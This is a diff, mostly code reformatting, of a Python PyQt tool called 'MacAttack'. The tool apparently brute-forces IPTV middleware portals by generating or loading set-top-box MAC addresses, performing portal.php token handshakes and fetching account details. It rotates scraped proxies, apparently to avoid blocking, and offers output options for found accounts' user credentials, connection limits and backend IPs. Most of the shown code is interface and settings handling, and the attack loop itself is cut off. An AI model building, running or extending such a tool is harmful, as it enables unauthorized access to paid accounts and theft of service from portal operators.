@@ -1,5 +1,5 @@
-#todo 
-#add option for bad proxies, dont pop immediately when checked.
+# todo
+# add option for bad proxies, dont pop immediately when checked.
 
 VERSION = "4.4.3"
 import semver
@@ -71,7 +71,9 @@ from PyQt5.QtWidgets import (
 import requests
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import quote, urlparse, urlunparse
+
 logging.basicConfig(level=logging.DEBUG)
+
 
 @contextmanager
 def no_proxy_environment():
@@ -95,7 +97,9 @@ def no_proxy_environment():
 
 
 def get_token(session, url, mac_address, timeout=30):
-    handshake_url = f"{url}/portal.php?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
+    handshake_url = (
+        f"{url}/portal.php?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
+    )
     try:
         serialnumber = hashlib.md5(mac_address.encode()).hexdigest().upper()
         sn = serialnumber[0:13]
@@ -124,7 +128,7 @@ def get_token(session, url, mac_address, timeout=30):
         response = session.get(
             handshake_url, cookies=cookies, headers=headers, timeout=timeout
         )
-        
+
         response.raise_for_status()
         token = response.json().get("js", {}).get("token")
         if token:
@@ -141,8 +145,8 @@ def get_token(session, url, mac_address, timeout=30):
 class ProxyFetcher(QThread):
     update_proxy_output_signal = pyqtSignal(str)
     update_proxy_textbox_signal = pyqtSignal(str)
-        # Signal to update the UI with valid proxies
-    valid_proxies_signal = pyqtSignal(list)
+    # Signal to update the UI with valid proxies
+    # valid_proxies_signal = pyqtSignal(list)
 
     def __init__(self):
         super().__init__()
@@ -256,32 +260,33 @@ class ProxyFetcher(QThread):
         return proxies
 
     def test_proxy(self, proxy):
-        #Checks if the returned JSON contains 'user': 'Evilvirus' and that the 'origin' matches the proxy IP.
-        url = "http://httpbin.org/anything?user=Evilvirus&application=MacAttack"  
+        # Checks if the returned JSON contains 'user': 'Evilvirus' and that the 'origin' matches the proxy IP.
+        url = "http://httpbin.org/anything?user=Evilvirus&application=MacAttack"
         proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
-        
+
         # Extract the IP address from the proxy, ignoring the port
         proxy_ip = urlparse(f"http://{proxy}").hostname
 
         try:
             with no_proxy_environment():  # Bypass the environment proxy set in the video player tab
                 response = requests.get(url, proxies=proxies, timeout=30)
-                
+
                 # Check for a successful response and if the returned JSON contains the user value
                 if response.status_code == 200:
                     json_response = response.json()
                     user = json_response.get("args", {}).get("user")
                     origin = json_response.get("origin")
-                    
+
                     # Log the proxy and origin values
                     logging.info(f"Proxy: {proxy}, Origin: {origin}")
-                    
+
                     # Check if the user is 'Evilvirus' and the origin matches the proxy IP (ignoring the port)
                     if user == "Evilvirus" and origin == proxy_ip:
                         return proxy, True
         except requests.RequestException as e:
             logging.debug(f"Error testing proxy {proxy}: {str(e)}")
         return proxy, False
+
 
 class RequestThread(QThread):
     request_complete = pyqtSignal(dict)  # Signal to emit when request is complete
@@ -363,18 +368,19 @@ class RequestThread(QThread):
                 account_info_url = f"{url}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
                 logging.debug(f"Fetching account info from {account_info_url}")
                 response_account_info = session.get(
-                    account_info_url, cookies=cookies, headers=headers, timeout=10, allow_redirects=False
+                    account_info_url,
+                    cookies=cookies,
+                    headers=headers,
+                    timeout=10,
+                    allow_redirects=False,
                 )
                 response_account_info.raise_for_status()
                 account_info_data = response_account_info.json()
                 logging.debug(f"Account info data: {account_info_data}")
             except Exception as e:
                 logging.error(f"Error fetching account info: {e}")
-                
-                account_info_data = {}
 
-            
-            
+                account_info_data = {}
 
             if self.category_type and self.category_id:
                 # Fetch channels in a category
@@ -723,9 +729,10 @@ class MacAttack(QMainWindow):
     update_mac_label_signal = pyqtSignal(str)
     update_output_text_signal = pyqtSignal(str)
     update_error_text_signal = pyqtSignal(str)
-    macattack_update_proxy_textbox_signal = pyqtSignal(str)  # macattack clean bad proxies
+    macattack_update_proxy_textbox_signal = pyqtSignal(
+        str
+    )  # macattack clean bad proxies
     macattack_update_mac_count_signal = pyqtSignal()  # macattack remove custom mac
-    
 
     def __init__(self):
         super().__init__()
@@ -758,14 +765,13 @@ class MacAttack(QMainWindow):
         self.recentlyfound = []
         self.output_file = None
         self.video_worker = None
-        self.current_request_thread = None 
-        self.last_trim_time = 0 
-        self.last_error_trim_time = (0)
+        self.current_request_thread = None
+        self.last_trim_time = 0
+        self.last_error_trim_time = 0
         self.proxy_fetcher = ProxyFetcher()
         self.hourly_timer = None
         self.remaining_time = 3600  # Time in seconds (3600 = 1 hour)
-        
-        
+
         # Connect signals from ProxyFetcher to update the UI
         self.proxy_fetcher.update_proxy_output_signal.connect(self.update_proxy_output)
         self.proxy_fetcher.update_proxy_textbox_signal.connect(
@@ -774,9 +780,7 @@ class MacAttack(QMainWindow):
         self.macattack_update_proxy_textbox_signal.connect(
             self.macattack_update_proxy_textbox
         )
-        self.macattack_update_mac_count_signal.connect(
-            self.macattack_update_mac_count
-        )
+        self.macattack_update_mac_count_signal.connect(self.macattack_update_mac_count)
         QApplication.setStyle("Fusion")
         theme = """
         QWidget {
@@ -1334,9 +1338,7 @@ class MacAttack(QMainWindow):
         proxybox_label = QLabel(
             "your proxies in this box, or use the button below to retrieve a list of proxies."
         )
-        proxybox_label.setContentsMargins(
-            15, 0, 0, 0
-        )  # 15px space on the left side
+        proxybox_label.setContentsMargins(15, 0, 0, 0)  # 15px space on the left side
         proxy_layout.addWidget(proxybox_label)
         # Output Text Area
         self.proxy_textbox = QTextEdit()
@@ -1351,13 +1353,10 @@ class MacAttack(QMainWindow):
         """
         )
         self.proxy_textbox.setReadOnly(False)
-        monospace_font = QFont(
-            "Lucida Console", 10
-        )
+        monospace_font = QFont("Lucida Console", 10)
         self.proxy_textbox.setFont(monospace_font)
         proxy_layout.addWidget(self.proxy_textbox)
-        
-        
+
         # Horizontal layout for the button and speed input
         generate_proxy_layout = QHBoxLayout()
 
@@ -1368,46 +1367,66 @@ class MacAttack(QMainWindow):
         # Button to generate proxies, connects to self.get_proxies() method
         self.generate_button = QPushButton("Get Proxies")
         self.generate_button.clicked.connect(self.get_proxies)
-        self.generate_button.setSizePolicy(QSizePolicy.Fixed, QSizePolicy.Fixed)  # Set size policy
+        self.generate_button.setSizePolicy(
+            QSizePolicy.Fixed, QSizePolicy.Fixed
+        )  # Set size policy
 
         # Button to test proxies, connects to self.test_proxies() method
         self.test_proxies_button = QPushButton("Test Proxies")
-        self.test_proxies_button.clicked.connect(self.test_proxies)  # Connect to test_proxies method
-        self.test_proxies_button.setSizePolicy(QSizePolicy.Fixed, QSizePolicy.Fixed)  # Set size policy
+        self.test_proxies_button.clicked.connect(
+            self.test_proxies
+        )  # Connect to test_proxies method
+        self.test_proxies_button.setSizePolicy(
+            QSizePolicy.Fixed, QSizePolicy.Fixed
+        )  # Set size policy
 
         # Add "Get Proxies" and "Test Proxies" buttons to the layout
         generate_proxy_layout.addWidget(self.generate_button)
         generate_proxy_layout.addWidget(self.test_proxies_button)  # Add the new button
-        generate_proxy_layout.addSpacing(15)  # 15px spacing between the buttons and slider
+        generate_proxy_layout.addSpacing(
+            15
+        )  # 15px spacing between the buttons and slider
 
         # Speed input (Slider)
         self.proxy_speed_label = QLabel("Speed:")
-        self.proxy_concurrent_tests = QSlider(Qt.Horizontal)  # Changed from QSpinBox to QSlider
+        self.proxy_concurrent_tests = QSlider(
+            Qt.Horizontal
+        )  # Changed from QSpinBox to QSlider
         self.proxy_concurrent_tests.setRange(1, 100)  # Range from 1 to 100
         self.proxy_concurrent_tests.setValue(100)  # Default value of 100
-        self.proxy_concurrent_tests.setTickPosition(QSlider.TicksBelow)  # Show ticks below the slider
-        self.proxy_concurrent_tests.setTickInterval(50)  # Interval between tick marks for better granularity
+        self.proxy_concurrent_tests.setTickPosition(
+            QSlider.TicksBelow
+        )  # Show ticks below the slider
+        self.proxy_concurrent_tests.setTickInterval(
+            50
+        )  # Interval between tick marks for better granularity
 
         # Dynamic label to show the current value of the slider
         self.proxy_speed_value_label = QLabel(str(self.proxy_concurrent_tests.value()))
-        self.proxy_concurrent_tests.valueChanged.connect(self.update_proxy_fetching_speed)
+        self.proxy_concurrent_tests.valueChanged.connect(
+            self.update_proxy_fetching_speed
+        )
 
         # Add the slider and related components to the layout
         generate_proxy_layout.addWidget(self.proxy_speed_label)
         generate_proxy_layout.addWidget(self.proxy_concurrent_tests)
-        generate_proxy_layout.addWidget(self.proxy_speed_value_label)  # Label showing the slider's value
+        generate_proxy_layout.addWidget(
+            self.proxy_speed_value_label
+        )  # Label showing the slider's value
 
         # Checkbox for "Update Hourly"
         self.update_hourly_checkbox = QCheckBox("Update Hourly")
         self.update_hourly_checkbox.setSizePolicy(QSizePolicy.Fixed, QSizePolicy.Fixed)
         self.update_hourly_checkbox.stateChanged.connect(self.proxy_auto_updater)
-        
+
         # Label to show the countdown timer
         self.update_timer_label = QLabel("")
         self.update_timer_label.setSizePolicy(QSizePolicy.Fixed, QSizePolicy.Fixed)
 
         # Add a 25px spacer before the "Update Hourly" checkbox
-        spacer_before_checkbox = QSpacerItem(25, 0, QSizePolicy.Fixed, QSizePolicy.Minimum)
+        spacer_before_checkbox = QSpacerItem(
+            25, 0, QSizePolicy.Fixed, QSizePolicy.Minimum
+        )
         generate_proxy_layout.addItem(spacer_before_checkbox)
 
         # Add the checkbox and label to the layout
@@ -1415,12 +1434,18 @@ class MacAttack(QMainWindow):
         generate_proxy_layout.addWidget(self.update_timer_label)
 
         # Spacer to push the proxy count label to the right
-        generate_proxy_layout.addStretch(1)  # This will push everything else to the left
+        generate_proxy_layout.addStretch(
+            1
+        )  # This will push everything else to the left
 
         # Proxy count label that will be updated
         self.proxy_count_label = QLabel("Proxies: 0")
-        self.proxy_count_label.setAlignment(Qt.AlignRight)  # Align the label to the right
-        self.proxy_count_label.setContentsMargins(0, 0, 15, 0)  # 15px space to the right side of the label
+        self.proxy_count_label.setAlignment(
+            Qt.AlignRight
+        )  # Align the label to the right
+        self.proxy_count_label.setContentsMargins(
+            0, 0, 15, 0
+        )  # 15px space to the right side of the label
 
         # Add the proxy count label to the layout
         generate_proxy_layout.addWidget(self.proxy_count_label)
@@ -1431,8 +1456,6 @@ class MacAttack(QMainWindow):
         # Add the horizontal layout to the main proxy layout
         proxy_layout.addLayout(generate_proxy_layout)
 
-        
-        
         # Proxy console output Area
         self.proxy_output = QTextEdit()
         self.proxy_output.setStyleSheet(
@@ -1457,23 +1480,23 @@ class MacAttack(QMainWindow):
         # Set a buffer for the proxy testing console
         self.proxy_output.textChanged.connect(self.trim_proxy_output)
 
-
     def proxy_auto_updater(self):
         if self.update_hourly_checkbox.isChecked():
-            logging.info"Update Hourly is checked.")
+            logging.info("Update Hourly is checked.")
             self.start_hourly_update()
         else:
-            logging.info"Update Hourly is unchecked.")
+            logging.info("Update Hourly is unchecked.")
             self.stop_hourly_update()
-
 
     # Start the hourly update timer
     def start_hourly_update(self):
         self.remaining_time = 3600  # Reset to 1 hour (3600 seconds)
         self.hourly_timer = QTimer(self)  # Create the timer
-        self.hourly_timer.timeout.connect(self.update_timer)  # Connect timeout signal to update_timer
+        self.hourly_timer.timeout.connect(
+            self.update_timer
+        )  # Connect timeout signal to update_timer
         self.hourly_timer.start(1000)  # Trigger every 1000 ms (1 second)
-        logging.info"Started hourly update timer.")
+        logging.info("Started hourly update timer.")
 
     # Stop the hourly update timer
     def stop_hourly_update(self):
@@ -1481,7 +1504,7 @@ class MacAttack(QMainWindow):
             self.hourly_timer.stop()  # Stop the timer
             self.hourly_timer = None  # Clear the timer reference
         self.update_timer_label.setText("")  # Reset label text
-        logging.info"Stopped hourly update timer.")
+        logging.info("Stopped hourly update timer.")
 
     # Update the countdown timer and execute get_proxies when it reaches 0
     def update_timer(self):
@@ -1494,16 +1517,13 @@ class MacAttack(QMainWindow):
             self.hourly_timer.stop()  # Stop the timer
             self.hourly_timer = None  # Clear the timer reference
             self.get_proxies()  # Execute the get_proxies function
-            logging.info"Executed get_proxies and restarting timer.")
+            logging.info("Executed get_proxies and restarting timer.")
             self.start_hourly_update()  # Restart the timer
-
-
 
     def test_proxies(self):
         # Extract proxies from the text box
         proxies = self.proxy_textbox.toPlainText().splitlines()
-        
-        
+
         self.proxy_output.append(f"Feature not yet available... Coming SOON!")
 
     def trim_proxy_output(self):
@@ -1643,21 +1663,19 @@ class MacAttack(QMainWindow):
         macs_label = QLabel("Custom MACs:")
         general_layout.addWidget(macs_label)
 
-        # "Use Custom MAC Addresses" checkbox        
+        # "Use Custom MAC Addresses" checkbox
         self.use_custom_macs_checkbox = QCheckBox("Use Custom MAC Addresses")
-        self.use_custom_macs_checkbox.stateChanged.connect(self.toggle_custom_macs_options)  # Connect signal to function
+        self.use_custom_macs_checkbox.stateChanged.connect(
+            self.toggle_custom_macs_options
+        )  # Connect signal to function
         general_layout.addWidget(self.use_custom_macs_checkbox)
-
-
-
-
-
-
 
         # Horizontal layout for file selection button, selected file label, "Mac Addresses in Pool:" label, and "macs_in_mem" label
         file_selection_layout = QHBoxLayout()
 
-        file_selection_layout.setContentsMargins(0, 0, 0, 0)  # No padding around the layout
+        file_selection_layout.setContentsMargins(
+            0, 0, 0, 0
+        )  # No padding around the layout
         file_selection_layout.setSpacing(10)  # No spacing between widgets
 
         # file selection button with fixed width of 120px
@@ -1681,20 +1699,23 @@ class MacAttack(QMainWindow):
         file_selection_layout.addWidget(self.macs_in_mem_label)
         general_layout.addLayout(file_selection_layout)
 
-
         # Add new checkbox for custom random MACs (initially hidden)
         self.custom_random_mac_checkbox = QCheckBox("Randomize Mac addresses")
         self.custom_random_mac_checkbox.setVisible(False)  # Initially hidden
         self.custom_random_mac_checkbox.setFixedWidth(200)  # Set width to 200
-        #self.custom_random_mac_checkbox.setAlignment(Qt.AlignLeft)  # Align left
+        # self.custom_random_mac_checkbox.setAlignment(Qt.AlignLeft)  # Align left
 
         # Create radio buttons for "Prefer Speed" and "Prefer Accuracy"
         self.prefer_speed_radio = QRadioButton("Prefer Speed")
         self.prefer_accuracy_radio = QRadioButton("Prefer Accuracy")
 
         # Set a light gray background for the radio buttons
-        self.prefer_speed_radio.setStyleSheet("QRadioButton { background-color: #666666; padding: 5px; }")
-        self.prefer_accuracy_radio.setStyleSheet("QRadioButton { background-color: #666666; padding: 5px; }")
+        self.prefer_speed_radio.setStyleSheet(
+            "QRadioButton { background-color: #666666; padding: 5px; }"
+        )
+        self.prefer_accuracy_radio.setStyleSheet(
+            "QRadioButton { background-color: #666666; padding: 5px; }"
+        )
 
         # Create a button group to ensure only one of the radio buttons is selected at a time
         self.radio_group = QButtonGroup()
@@ -1719,8 +1740,9 @@ class MacAttack(QMainWindow):
         general_layout.addLayout(inline_layout)
 
         # Connect the checkbox state change to the function
-        self.custom_random_mac_checkbox.stateChanged.connect(self.custommac_random_checkbox_func)
-
+        self.custom_random_mac_checkbox.stateChanged.connect(
+            self.custommac_random_checkbox_func
+        )
 
         general_layout.addSpacing(20)
 
@@ -1733,7 +1755,9 @@ class MacAttack(QMainWindow):
         system_settings_checkboxes = QHBoxLayout()
 
         self.file_select_button.setVisible(False)  # Hide the file selection button
-        self.mac_file_label.setVisible(False)  # Hide the label showing the selected file
+        self.mac_file_label.setVisible(
+            False
+        )  # Hide the label showing the selected file
         self.pool_label.setVisible(False)  # Hide the "Mac Addresses in Pool:" label
         self.macs_in_mem_label.setVisible(False)  # Hide the "macs_in_mem" label
 
@@ -1757,7 +1781,6 @@ class MacAttack(QMainWindow):
         # the tab widget to the main layout
         layout.addWidget(tab_widget)
 
-        
         # OUTPUT TAB
         output_label = QLabel("Output Settings")
         output_label.setAlignment(Qt.AlignTop)
@@ -1829,7 +1852,9 @@ class MacAttack(QMainWindow):
 
         # IP addresses and Portal Location/Timezone (side by side)
         self.ip_address_output_checkbox = QCheckBox("IP Addresses")
-        self.location_output_checkbox = QCheckBox("Location/Timezone (IP address req'd)")
+        self.location_output_checkbox = QCheckBox(
+            "Location/Timezone (IP address req'd)"
+        )
         self.ip_address_output_checkbox.setFixedWidth(output_checkbox_width)
         self.location_output_checkbox.setFixedWidth(output_checkbox_width)
         horizontal_layout_2.addWidget(self.ip_address_output_checkbox)
@@ -1853,7 +1878,6 @@ class MacAttack(QMainWindow):
         self.proxy_used_output_checkbox = QCheckBox("Proxy Used")
         self.proxy_used_output_checkbox.setFixedWidth(output_checkbox_width)
 
-        
         # checkbox for something later, next to proxy info
         self.proxy_location_output_checkbox = QCheckBox(
             "Proxy Location (Proxy Used Req'd)"
@@ -1963,18 +1987,24 @@ class MacAttack(QMainWindow):
         # When the checkbox is checked
         if state == Qt.Checked:
             if self.mac_dict:  # If mac_dict isn't empty
-                self.custom_random_mac_checkbox.setText("Please wait... Shuffling list.")
+                self.custom_random_mac_checkbox.setText(
+                    "Please wait... Shuffling list."
+                )
                 QApplication.processEvents()
                 # Shuffle the mac_dict
                 mac_list = list(self.mac_dict)
                 random.shuffle(mac_list)  # Shuffle the MAC list
-                self.mac_dict = deque(mac_list)  # Update mac_dict with the shuffled list
+                self.mac_dict = deque(
+                    mac_list
+                )  # Update mac_dict with the shuffled list
                 self.custom_random_mac_checkbox.setText("Randomize Mac addresses")
 
         # When the checkbox is unchecked
         else:
             if self.mac_dict:
-                self.custom_random_mac_checkbox.setText("Please wait... Reloading list.")
+                self.custom_random_mac_checkbox.setText(
+                    "Please wait... Reloading list."
+                )
                 QApplication.processEvents()
                 # Get the text from the mac_file_label
                 file_path = self.mac_file_label.text()
@@ -1988,7 +2018,6 @@ class MacAttack(QMainWindow):
 
     def toggle_custom_macs_options(self, state):
         logging.info("toggled custom mac")
-        
 
         if state == Qt.Checked:
             self.use_custom_macs_checkbox.setText(
@@ -2003,7 +2032,6 @@ class MacAttack(QMainWindow):
             self.pool_label.setVisible(True)
             self.macs_in_mem_label.setVisible(True)
             self.custom_random_mac_checkbox.setVisible(True)
-            
 
         else:
             self.mac_file_label.setText("No file selected")
@@ -2011,20 +2039,19 @@ class MacAttack(QMainWindow):
             self.use_custom_macs_checkbox.setText("Enable Custom MAC Addresses")
             self.prefer_speed_radio.setVisible(False)
             self.prefer_accuracy_radio.setVisible(False)
-            self.file_select_button.setVisible(False) 
-            self.mac_file_label.setVisible(False) 
-            self.pool_label.setVisible(False)  
-            self.macs_in_mem_label.setVisible(False)  
+            self.file_select_button.setVisible(False)
+            self.mac_file_label.setVisible(False)
+            self.pool_label.setVisible(False)
+            self.macs_in_mem_label.setVisible(False)
             self.custom_random_mac_checkbox.setVisible(False)
 
-            
-            
     # File selection function
-
 
     def select_file(self):
         file_dialog = QFileDialog()
-        file_path, _ = file_dialog.getOpenFileName(None, "Mac Addresses List", "", "All Files (*)")
+        file_path, _ = file_dialog.getOpenFileName(
+            None, "Mac Addresses List", "", "All Files (*)"
+        )
         if file_path:
             self.mac_file = file_path
             self.mac_file_label.setText(f"Selected File: {self.mac_file}")
@@ -2035,7 +2062,7 @@ class MacAttack(QMainWindow):
         unique_macs = set()  # A set to store unique MAC addresses
 
         try:
-            with open(file_path, 'r') as file:
+            with open(file_path, "r") as file:
                 lines = file.readlines()
                 contains_mac_addr_phrase = any("MAC Addr: " in line for line in lines)
 
@@ -2046,12 +2073,18 @@ class MacAttack(QMainWindow):
                         if contains_mac_addr_phrase:
                             # Only consider lines containing "MAC Addr: "
                             if "MAC Addr: " in mac_address:
-                                mac_address = mac_address.replace("MAC Addr: ", "").strip()  # Remove the prefix
+                                mac_address = mac_address.replace(
+                                    "MAC Addr: ", ""
+                                ).strip()  # Remove the prefix
                                 if mac_address:  # Ensure it's not empty after stripping
-                                    unique_macs.add(mac_address)  # Add to set (automatically handles duplicates)
+                                    unique_macs.add(
+                                        mac_address
+                                    )  # Add to set (automatically handles duplicates)
                         else:
                             # If the phrase "MAC Addr: " is not present in any line, consider the line as a MAC address
-                            unique_macs.add(mac_address)  # Add to set (automatically handles duplicates)
+                            unique_macs.add(
+                                mac_address
+                            )  # Add to set (automatically handles duplicates)
 
             # Now update mac_dict with unique MAC addresses
             self.mac_dict = deque(unique_macs)
@@ -2063,18 +2096,20 @@ class MacAttack(QMainWindow):
 
             if self.custom_random_mac_checkbox.checkState() == Qt.Checked:
                 if self.mac_dict:  # If mac_dict isn't empty
-                    self.custom_random_mac_checkbox.setText("Please wait... Shuffling list.")
+                    self.custom_random_mac_checkbox.setText(
+                        "Please wait... Shuffling list."
+                    )
                     QApplication.processEvents()
                     # Shuffle the mac_dict
                     mac_list = list(self.mac_dict)
                     random.shuffle(mac_list)  # Shuffle the MAC list
-                    self.mac_dict = deque(mac_list)  # Update mac_dict with the shuffled list   
+                    self.mac_dict = deque(
+                        mac_list
+                    )  # Update mac_dict with the shuffled list
                     self.custom_random_mac_checkbox.setText("Randomize Mac addresses")
 
         except Exception as e:
             logging.error(f"Error loading MAC file: {e}")
-            
-
 
     def enable_ludicrous_speed(self):
         if self.ludicrous_speed_checkbox.isChecked():
@@ -2089,9 +2124,7 @@ class MacAttack(QMainWindow):
             self.proxy_concurrent_tests.setRange(1, 1000)
         else:
             # Reset text and styling for unchecked state
-            self.ludicrous_speed_checkbox.setText(
-                "Enable Ludicrous Speed!"
-            )
+            self.ludicrous_speed_checkbox.setText("Enable Ludicrous Speed!")
             self.ludicrous_speed_checkbox.setStyleSheet(
                 "QCheckBox { background-color: #666666; color: white; }"
             )
@@ -2344,7 +2377,6 @@ class MacAttack(QMainWindow):
             self.use_custom_macs_checkbox.setChecked(False)
             self.update_hourly_checkbox.setChecked(False)
 
-
             logging.debug("UI reset to default values.")
         except Exception as e:
             logging.error(f"Error while performing factory reset: {e}")
@@ -2358,11 +2390,19 @@ class MacAttack(QMainWindow):
         file_path = os.path.join(user_dir, "evilvir.us", "MacAttack.ini")
         config = configparser.ConfigParser()
         config["Settings"] = {
-            "update_hourly": str(self.update_hourly_checkbox.isChecked()),  # Save Update Hourly checkbox state
+            "update_hourly": str(
+                self.update_hourly_checkbox.isChecked()
+            ),  # Save Update Hourly checkbox state
             "mac_file": self.mac_file_label.text(),  # Save label text
-            "custom_random_mac": str(self.custom_random_mac_checkbox.isChecked()),  # Save the random MAC checkbox state
-            "prefer_speed": str(self.prefer_speed_radio.isChecked()),  # Save the state of the 'Prefer Speed' radio button
-            "prefer_accuracy": str(self.prefer_accuracy_radio.isChecked()),  # Save the state of the 'Prefer Accuracy' radio button
+            "custom_random_mac": str(
+                self.custom_random_mac_checkbox.isChecked()
+            ),  # Save the random MAC checkbox state
+            "prefer_speed": str(
+                self.prefer_speed_radio.isChecked()
+            ),  # Save the state of the 'Prefer Speed' radio button
+            "prefer_accuracy": str(
+                self.prefer_accuracy_radio.isChecked()
+            ),  # Save the state of the 'Prefer Accuracy' radio button
             "iptv_link": self.iptv_link_entry.text(),
             "concurrent_tests": self.concurrent_tests.value(),
             "hostname": self.hostname_input.text(),
@@ -2384,16 +2424,22 @@ class MacAttack(QMainWindow):
             "username_output": str(self.username_output_checkbox.isChecked()),
             "datefound_output": str(self.datefound_output_checkbox.isChecked()),
             "singleoutputfile": str(self.singleoutputfile_checkbox.isChecked()),
-            "max_connections_output": str(self.max_connections_output_checkbox.isChecked()),
+            "max_connections_output": str(
+                self.max_connections_output_checkbox.isChecked()
+            ),
             "date_created_output": str(self.date_created_output_checkbox.isChecked()),
             "proxy_used_output": str(self.proxy_used_output_checkbox.isChecked()),
             "proxy_input": self.proxy_input.text(),
             "output_buffer": str(self.output_buffer_spinbox.value()),
             "dont_update": str(self.dont_update_checkbox.isChecked()),
-            "proxy_location_output": str(self.proxy_location_output_checkbox.isChecked()),
-            "use_custom_macs": str(self.use_custom_macs_checkbox.isChecked()),  # Save checkbox state
-#            "custom_macs_text": self.custom_macs_textbox.toPlainText(),  # Save text box content
-#            "restore_custom_macs": str(self.restore_custom_macs_checkbox.isChecked())  # Save restore checkbox state
+            "proxy_location_output": str(
+                self.proxy_location_output_checkbox.isChecked()
+            ),
+            "use_custom_macs": str(
+                self.use_custom_macs_checkbox.isChecked()
+            ),  # Save checkbox state
+            #            "custom_macs_text": self.custom_macs_textbox.toPlainText(),  # Save text box content
+            #            "restore_custom_macs": str(self.restore_custom_macs_checkbox.isChecked())  # Save restore checkbox state
         }
         config["Window"] = {
             "width": self.width(),
@@ -2417,7 +2463,9 @@ class MacAttack(QMainWindow):
                 config.get("Settings", "update_hourly", fallback="False") == "True"
             )
             self.mac_file_label.setText(
-                config.get("Settings", "mac_file", fallback="No file selected")  # Restore the label text
+                config.get(
+                    "Settings", "mac_file", fallback="No file selected"
+                )  # Restore the label text
             )
             self.custom_random_mac_checkbox.setChecked(
                 config.get("Settings", "custom_random_mac", fallback="False") == "True"
@@ -2515,13 +2563,13 @@ class MacAttack(QMainWindow):
             self.use_custom_macs_checkbox.setChecked(
                 config.get("Settings", "use_custom_macs", fallback="False") == "True"
             )
-#            self.custom_macs_textbox.setPlainText(
-#                config.get("Settings", "custom_macs_text", fallback="")
-#            )
-#            # Load the restore checkbox state
-#            self.restore_custom_macs_checkbox.setChecked(
-#                config.get("Settings", "restore_custom_macs", fallback="False") == "True"
-#            )
+            #            self.custom_macs_textbox.setPlainText(
+            #                config.get("Settings", "custom_macs_text", fallback="")
+            #            )
+            #            # Load the restore checkbox state
+            #            self.restore_custom_macs_checkbox.setChecked(
+            #                config.get("Settings", "restore_custom_macs", fallback="False") == "True"
+            #            )
             # Load window geometry
             if config.has_section("Window"):
                 self.resize(
@@ -2532,22 +2580,20 @@ class MacAttack(QMainWindow):
                     config.getint("Window", "x", fallback=200),
                     config.getint("Window", "y", fallback=200),
                 )
-                
+
             if self.use_custom_macs_checkbox.isChecked():
                 file_path = self.mac_file_label.text()
                 # Strip the phrase "Selected File: " from the file_path
                 file_path = file_path.replace("Selected File: ", "").strip()
                 # Load the file
-                self.load_mac_file(file_path)             
-                
-                
+                self.load_mac_file(file_path)
+
             logging.debug("Settings loaded.")
         else:
             logging.debug("No settings file found.")
         if not self.dont_update_checkbox.isChecked():
-            
-            self.get_update()
 
+            self.get_update()
 
     def set_window_icon(self):
         # Base64 encoded image string (replace with your own base64 string)
@@ -2616,10 +2662,8 @@ class MacAttack(QMainWindow):
             thread.start()
             # Track threads
             self.threads.append(thread)
-        #self.SaveTheDay()
+        # self.SaveTheDay()
 
-          
-            
     def RandomMacGenerator(self, prefix="00:1A:79:"):
         custommacs = self.use_custom_macs_checkbox.isChecked()
 
@@ -2633,31 +2677,33 @@ class MacAttack(QMainWindow):
 
             # Get and remove the first MAC address efficiently
             if self.prefer_speed_radio.isChecked():
-                first_mac = self.mac_dict.popleft()  # O(1) operation to pop from the front of deque
+                first_mac = (
+                    self.mac_dict.popleft()
+                )  # O(1) operation to pop from the front of deque
             else:
-                first_mac = self.mac_dict[0]  # Access the first element, but don't remove it
+                first_mac = self.mac_dict[
+                    0
+                ]  # Access the first element, but don't remove it
             return first_mac
 
-        
     def macattack_update_proxy_textbox(self, new_text):
         """
         Slot to update the text of the proxy textbox.
         This is triggered by a signal, and it sets the textbox's content to `new_text`.
         """
         if self.proxy_textbox:
-            self.proxy_textbox.setText(new_text)  # Set the text of the textbox to the provided new text
+            self.proxy_textbox.setText(
+                new_text
+            )  # Set the text of the textbox to the provided new text
         else:
             logging.error("Proxy textbox is not initialized.")
 
     def macattack_update_mac_count(self):
-        mac_count = len(self.mac_dict) 
+        mac_count = len(self.mac_dict)
         if self.macs_in_mem_label:
             self.macs_in_mem_label.setText(f"MACs in memory: {mac_count}")
         else:
-            logging.error("MAC count label is not initialized.")      
-        
-
-    
+            logging.error("MAC count label is not initialized.")
 
     def BigMacAttack(self):
         global mac_count
@@ -2670,51 +2716,32 @@ class MacAttack(QMainWindow):
         password = None
         middleware_city = None
         middleware_ip_address = None
-        self.recentlyfound = [] # Erase recently found list
+        self.recentlyfound = []  # Erase recently found list
         self.nomacs = 1
         while self.running:  # Loop will continue as long as self.running is True
-            
+
             # Checkbox states
-            include_date_found = (
-                self.datefound_output_checkbox.isChecked()
-            )
-            include_deviceids = (
-                self.deviceid_output_checkbox.isChecked()
-            )
-            include_user_creds = (
-                self.username_output_checkbox.isChecked()
-            )
-            include_backend_info = (
-                self.backend_output_checkbox.isChecked()
-            )
-            include_ip_addresses = (
-                self.ip_address_output_checkbox.isChecked()
-            )
-            include_location_and_timezone = (
-                self.location_output_checkbox.isChecked()
-            )
-            include_max_connections = (
-                self.max_connections_output_checkbox.isChecked()
-            )
-            include_date_created = (
-                self.date_created_output_checkbox.isChecked()
-            )
-            include_proxy_used = (
-                self.proxy_used_output_checkbox.isChecked()
-            )
-            include_proxy_location = (
-                self.proxy_location_output_checkbox.isChecked()
-            )            
-            
-            custommacs = self.use_custom_macs_checkbox.isChecked()  # Check the state of the checkbox
-            
+            include_date_found = self.datefound_output_checkbox.isChecked()
+            include_deviceids = self.deviceid_output_checkbox.isChecked()
+            include_user_creds = self.username_output_checkbox.isChecked()
+            include_backend_info = self.backend_output_checkbox.isChecked()
+            include_ip_addresses = self.ip_address_output_checkbox.isChecked()
+            include_location_and_timezone = self.location_output_checkbox.isChecked()
+            include_max_connections = self.max_connections_output_checkbox.isChecked()
+            include_date_created = self.date_created_output_checkbox.isChecked()
+            include_proxy_used = self.proxy_used_output_checkbox.isChecked()
+            include_proxy_location = self.proxy_location_output_checkbox.isChecked()
+
+            custommacs = (
+                self.use_custom_macs_checkbox.isChecked()
+            )  # Check the state of the checkbox
+
             if custommacs:
-                self.macattack_update_mac_count_signal.emit()            
-            
+                self.macattack_update_mac_count_signal.emit()
+
             created_at = None
             max_connections = None
             active_cons = None
-            
 
             if self.proxy_enabled_checkbox.isChecked():
                 # Get the proxies from the textbox, splitting by line
@@ -2732,19 +2759,18 @@ class MacAttack(QMainWindow):
